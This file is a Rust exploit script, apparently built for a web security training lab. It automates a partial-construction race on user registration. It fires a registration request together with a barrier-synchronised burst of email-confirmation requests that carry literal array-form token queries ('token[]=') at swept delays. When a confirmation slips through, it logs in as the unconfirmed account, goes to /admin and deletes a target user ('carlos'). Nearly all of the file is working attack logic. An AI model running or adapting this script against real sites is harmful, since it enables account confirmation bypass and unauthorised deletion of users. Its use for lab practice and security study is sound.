#!/usr/bin/env rust-script
//! name: pcreg_lit
//! description: 半构造注册竞态 - 字面确认查询爆发件(partial-construction registration race with LITERAL confirm queries):每轮独立会话取 /register 的 csrf,屏障齐放 1 发 POST /register + K 发 POST /confirm?<字面查询>,查询串原样入 URL(可发 token[]= 数组名形、token[] 无等号形、token[0]= 形),确认默认携带注册会话 cookie(--no-session 反证),--stagger-us 扫描确认相对注册的到达时刻;任一确认离开基线(400 Incorrect token / 403 Forbidden)即命中,命中即用该账号登录并走 /admin 删除目标用户,末尾回读横幅。补 pcreg_burst 只能发 ?token=<值> 单形、无法表达参数名侧数组语法的缺口。
//! version: 1.3.0
//! args: <base-url> [--queries 'token[]=,token[]'] [--rounds N] [--confirms K] [--tag S] [--email-domain ginandjuice.shop] [--password P] [--stagger-us '0,20000,..'] [--no-session] [--delete-user carlos] [--snippet N] [--timeout-ms N] [--selftest]
//! keywords: 半构造, partial construction, 竞态, race, token[], 字面查询, 注册, confirm, 屏障, 单包
//!
//! ```cargo
//! [dependencies]
//! ureq = { version = "2" }
//! ```

use pi_rust_lib::report;
use pi_rust_lib::serde_json::{json, Value};
use std::collections::BTreeMap;
use std::sync::{Arc, Barrier};
use std::time::{Duration, Instant};

struct Resp {
    status: u16,
    body: String,
    cookie: Option<String>,
    location: Option<String>,
    ms: u128,
}

fn send(
    agent: &ureq::Agent,
    method: &str,
    url: &str,
    cookie: Option<&str>,
    body: Option<&str>,
) -> Resp {
    let t0 = Instant::now();
    let mut req = agent.request(method, url);
    if let Some(c) = cookie {
        req = req.set("Cookie", c);
    }
    if body.is_some() {
        req = req.set("Content-Type", "application/x-www-form-urlencoded");
    }
    let out = match body {
        Some(b) => req.send_string(b),
        None => req.call(),
    };
    let ms = t0.elapsed().as_millis();
    let take = |r: &ureq::Response| {
        (
            r.status(),
            r.header("set-cookie")
                .map(|s| s.split(';').next().unwrap_or("").to_string()),
            r.header("location").map(|s| s.to_string()),
        )
    };
    match out {
        Ok(r) => {
            let (status, cookie, location) = take(&r);
            let body = r.into_string().unwrap_or_default();
            Resp { status, body, cookie, location, ms }
        }
        Err(ureq::Error::Status(code, r)) => {
            let (_, cookie, location) = take(&r);
            let body = r.into_string().unwrap_or_default();
            Resp { status: code, body, cookie, location, ms }
        }
        Err(e) => Resp {
            status: 0,
            body: format!("transport error: {e}"),
            cookie: None,
            location: None,
            ms,
        },
    }
}

fn csrf_of(html: &str) -> Option<String> {
    let idx = html.find("name=\"csrf\"")?;
    let rest = &html[idx..];
    let v = rest.find("value=")?;
    let rest = rest[v + 6..].trim_start();
    let quote = rest.chars().next()?;
    if quote != '"' && quote != '\'' {
        return None;
    }
    let rest = &rest[1..];
    let end = rest.find(quote)?;
    Some(rest[..end].to_string())
}

fn snippet(s: &str, n: usize) -> String {
    let t: String = s.split_whitespace().collect::<Vec<_>>().join(" ");
    if t.chars().count() > n {
        t.chars().take(n).collect::<String>() + "..."
    } else {
        t
    }
}

fn urlencode(s: &str) -> String {
    let mut out = String::new();
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => out.push(b as char),
            _ => out.push_str(&format!("%{b:02X}")),
        }
    }
    out
}

fn arg(args: &[String], i: usize) -> String {
    args.get(i + 1).cloned().unwrap_or_default()
}

fn login_ok(r: &Resp) -> bool {
    r.status != 200 || (!r.body.contains("Invalid username or password") && !r.body.contains("name=\"username\""))
}

/// No-redirect login: a successful auth answers 302 -> /my-account with a fresh session cookie.
/// Following the redirect inside ureq loses the new cookie, which reads as a false negative.
fn try_login(agent: &ureq::Agent, base: &str, user: &str, pass: &str) -> (bool, Resp, Option<String>) {
    let page = send(agent, "GET", &format!("{base}/login"), None, None);
    let csrf = csrf_of(&page.body).unwrap_or_default();
    let body = format!(
        "csrf={}&username={}&password={}",
        urlencode(&csrf),
        urlencode(user),
        urlencode(pass)
    );
    let r = send(agent, "POST", &format!("{base}/login"), page.cookie.as_deref(), Some(&body));
    let ok = (r.status == 302 && r.location.as_deref().unwrap_or("").contains("my-account")) || login_ok(&r);
    let session = r.cookie.clone().or_else(|| page.cookie.clone());
    (ok, r, session)
}

/// Session-cookie-threaded banner read (no agent jar assumptions).
fn read_banner(agent: &ureq::Agent, base: &str, session: Option<&str>) -> (bool, String) {
    let r = send(agent, "GET", &format!("{base}/"), session, None);
    let solved = r.body.contains("is-solved");
    let line = r
        .body
        .split("widgetcontainer-lab-status")
        .nth(1)
        .map(|s| snippet(s, 120))
        .unwrap_or_default();
    (solved, line)
}

fn last_chars(s: &str, n: usize) -> String {
    let c: Vec<char> = s.chars().collect();
    let start = c.len().saturating_sub(n);
    c[start..].iter().collect()
}

struct Job {
    url: String,
    body: Option<String>,
    cookie: Option<String>,
    delay_us: u64,
    kind: &'static str,
    cand: String,
    round: usize,
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--selftest") {
        let base = "https://x";
        let q = "token[]=";
        let ok = format!("{base}/confirm?{q}") == "https://x/confirm?token[]="
            && csrf_of("<input required type=\"hidden\" name=\"csrf\" value=\"AbC123\">").as_deref()
                == Some("AbC123")
            && urlencode("a b") == "a%20b";
        pi_rust_lib::report::success(
            "pcreg_lit",
            json!({"selftest": if ok { "ok" } else { "fail" }}),
            "literal query + csrf parser covered",
        )
        .unwrap_or(());
        std::process::exit(if ok { 0 } else { 1 });
    }

    let mut base = String::new();
    let mut rounds = 20usize;
    let mut confirms = 4usize;
    let mut tag = "pl".to_string();
    let mut domain = "ginandjuice.shop".to_string();
    let mut password = "peter123".to_string();
    let mut queries: Vec<String> = vec!["token[]=".into(), "token[]".into(), "token[0]=".into()];
    let mut staggers: Vec<u64> = vec![
        0, 10000, 20000, 30000, 45000, 60000, 80000, 100000, 130000, 160000, 200000, 250000,
        300000, 400000, 500000, 700000,
    ];
    let mut use_session = true;
    let mut delete_user = String::new();
    let mut snip = 120usize;
    let mut timeout_ms = 30000u64;

    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--rounds" => rounds = arg(&args, i).parse().unwrap_or(rounds),
            "--confirms" => confirms = arg(&args, i).parse().unwrap_or(confirms).clamp(1, 32),
            "--tag" => tag = arg(&args, i),
            "--email-domain" => domain = arg(&args, i),
            "--password" => password = arg(&args, i),
            "--queries" => {
                let v: Vec<String> = arg(&args, i).split(',').map(|s| s.to_string()).filter(|s| !s.is_empty()).collect();
                if !v.is_empty() {
                    queries = v;
                }
            }
            "--stagger-us" => {
                let v: Vec<u64> = arg(&args, i).split(',').filter_map(|s| s.trim().parse().ok()).collect();
                if !v.is_empty() {
                    staggers = v;
                }
            }
            "--no-session" => use_session = false,
            "--delete-user" => delete_user = arg(&args, i),
            "--snippet" => snip = arg(&args, i).parse().unwrap_or(snip),
            "--timeout-ms" => timeout_ms = arg(&args, i).parse().unwrap_or(timeout_ms),
            other if !other.starts_with("--") && base.is_empty() => base = other.trim_end_matches('/').to_string(),
            _ => {}
        }
        i += 1;
    }
    if base.is_empty() {
        report::failure(
            "pcreg_lit",
            "usage: pcreg_lit <base-url> [--queries 'token[]=,token[]'] [--rounds N] [--confirms K] [--stagger-us '0,20000'] [--same-session]",
            "pass the lab instance URL",
        );
        std::process::exit(2);
    }

    let mk_agent = || ureq::AgentBuilder::new().timeout(Duration::from_millis(timeout_ms)).build();
    let lanes: Vec<ureq::Agent> = (0..confirms).map(|_| mk_agent()).collect();
    for a in &lanes {
        let _ = send(a, "GET", &format!("{base}/"), None, None);
    }
    let session = mk_agent();
    let _ = send(&session, "GET", &format!("{base}/"), None, None);

    let mut round_log: Vec<Value> = Vec::new();
    let mut hit_rows: Vec<Value> = Vec::new();
    let mut winner: Option<Value> = None;

    for r in 0..rounds {
        let user = format!("{tag}{}", r + 1);
        let email = format!("{user}@{domain}");
        let page = send(&session, "GET", &format!("{base}/register"), None, None);
        let sid = page.cookie.clone();
        let csrf = match csrf_of(&page.body) {
            Some(c) => c,
            None => {
                round_log.push(json!({"round": r + 1, "error": "no csrf", "body": snippet(&page.body, snip)}));
                continue;
            }
        };
        let reg_body = format!(
            "csrf={}&username={}&email={}&password={}",
            urlencode(&csrf),
            urlencode(&user),
            urlencode(&email),
            urlencode(&password)
        );

        let mut jobs: Vec<Job> = vec![Job {
            url: format!("{base}/register"),
            body: Some(reg_body),
            cookie: sid.clone(),
            delay_us: 0,
            kind: "register",
            cand: "-".into(),
            round: r + 1,
        }];
        for k in 0..confirms {
            let q = queries[(k + r) % queries.len()].clone();
            let stag = staggers[(k + r) % staggers.len()];
            // 交替:偶发带注册会话 cookie(应用按会话定位半构造行),奇发裸发(反证同会话非必要条件)
            let cookie = if use_session && k % 2 == 0 { sid.clone() } else { None };
            jobs.push(Job {
                url: format!("{base}/confirm?{q}"),
                body: None,
                cookie,
                delay_us: stag,
                kind: "confirm",
                cand: q,
                round: r + 1,
            });
        }

        let jobs = Arc::new(jobs);
        let barrier = Arc::new(Barrier::new(jobs.len()));
        let out = Arc::new(std::sync::Mutex::new(Vec::new()));
        let mut handles = Vec::new();
        for idx in 0..jobs.len() {
            let jobs = jobs.clone();
            let barrier = barrier.clone();
            let out = out.clone();
            let agent = if idx == 0 { session.clone() } else { lanes[idx - 1].clone() };
            handles.push(std::thread::spawn(move || {
                barrier.wait();
                let job = &jobs[idx];
                if job.delay_us > 0 {
                    std::thread::sleep(Duration::from_micros(job.delay_us));
                }
                let resp = send(&agent, "POST", &job.url, job.cookie.as_deref(), job.body.as_deref());
                let mut body_path = String::new();
                if job.kind == "confirm" && resp.status != 400 && resp.status != 403 {
                    let p = format!("/tmp/pcreg_lit_hit_r{}_k{}.html", job.round, idx);
                    if std::fs::write(&p, &resp.body).is_ok() {
                        body_path = p;
                    }
                }
                let tail: String = {
                    let c: Vec<char> = resp.body.chars().collect();
                    let start = c.len().saturating_sub(600);
                    c[start..].iter().collect()
                };
                out.lock().unwrap_or_else(|e| e.into_inner()).push(json!({
                    "kind": job.kind,
                    "candidate": job.cand,
                    "stagger_us": job.delay_us,
                    "status": resp.status,
                    "ms": resp.ms,
                    "len": resp.body.len(),
                    "location": resp.location,
                    "body": snippet(&resp.body, snip),
                    "body_tail": snippet(&tail, 600),
                    "body_path": body_path,
                    "same_session": job.cookie.is_some(),
                }));
            }));
        }
        for h in handles {
            let _ = h.join();
        }
        let rows = out.lock().unwrap_or_else(|e| e.into_inner()).clone();

        let mut hist: BTreeMap<String, usize> = BTreeMap::new();
        let mut reg = json!(null);
        let mut anomalies: Vec<Value> = Vec::new();
        for row in rows.iter() {
            let kind = row.get("kind").and_then(|v| v.as_str()).unwrap_or("");
            let status = row.get("status").and_then(|v| v.as_u64()).unwrap_or(0);
            if kind == "register" {
                reg = row.clone();
                continue;
            }
            let cand = row.get("candidate").and_then(|v| v.as_str()).unwrap_or("-").to_string();
            *hist.entry(format!("{cand}:{status}")).or_insert(0) += 1;
            // baseline for this app: 400 "Incorrect token" / 403 "Forbidden"; 500 on %00 is a static crash path.
            let static_crash = status == 500
                && row.get("body").and_then(|v| v.as_str()).unwrap_or("").contains("Internal Server Error");
            if status != 400 && status != 403 && !static_crash {
                anomalies.push(row.clone());
                hit_rows.push(row.clone());
            }
        }

        let mut verify: Value = Value::Null;
        if !anomalies.is_empty() {
            // no-redirect agent: the login leg must read the 302 + Set-Cookie itself
            let agent = ureq::AgentBuilder::new()
                .timeout(Duration::from_millis(timeout_ms))
                .redirects(0)
                .build();
            let (ok, resp, session) = try_login(&agent, &base, &user, &password);
            let mut del = Value::Null;
            let mut banner_solved = false;
            let mut banner = String::new();
            if ok && !delete_user.is_empty() {
                let admin = send(&agent, "GET", &format!("{base}/admin"), session.as_deref(), None);
                let acsrf = csrf_of(&admin.body).unwrap_or_default();
                let g = send(
                    &agent,
                    "GET",
                    &format!("{base}/admin/delete?username={delete_user}"),
                    session.as_deref(),
                    None,
                );
                let p = send(
                    &agent,
                    "POST",
                    &format!("{base}/admin/delete"),
                    session.as_deref(),
                    Some(&format!("csrf={}&username={}", urlencode(&acsrf), urlencode(&delete_user))),
                );
                del = json!({"admin_status": admin.status, "admin_has_carlos": admin.body.contains(&delete_user), "csrf": !acsrf.is_empty(), "get_status": g.status, "get_location": g.location, "post_status": p.status, "post_location": p.location, "get_tail": snippet(&last_chars(&g.body, 300), 300), "post_tail": snippet(&last_chars(&p.body, 300), 300)});
            }
            if session.is_some() {
                let (s, line) = read_banner(&agent, &base, session.as_deref());
                banner_solved = s;
                banner = line;
            }
            verify = json!({
                "login_ok": ok,
                "login_status": resp.status,
                "login_location": resp.location,
                "login_tail": snippet(&last_chars(&resp.body, 400), 400),
                "session_cookie": session,
                "delete": del,
                "banner_solved": banner_solved,
                "banner": banner,
            });
            if ok {
                winner = Some(json!({"round": r + 1, "user": user.clone(), "verify": verify, "anomalies": anomalies}));
            }
        }

        round_log.push(json!({
            "round": r + 1,
            "user": user,
            "register": reg,
            "confirm_hist": hist,
            "anomalies": anomalies,
            "verify": verify,
        }));

        if winner.is_some() {
            break;
        }
    }

    let (bsolved, bline) = read_banner(&session, &base, None);
    let data = json!({
        "result": "race-run",
        "base": base,
        "queries": queries,
        "staggers_us": staggers,
        "same_session": use_session,
        "rounds_run": round_log.len(),
        "rounds": round_log,
        "hit_rows": hit_rows,
        "winner": winner,
        "banner_solved": bsolved,
        "banner": bline,
    });
    report::success(
        "pcreg_lit",
        data,
        "any non-400/403 confirm row is a window hit; winner.login_ok + delete < 400 + banner_solved => solved",
    )
    .unwrap_or(());
}
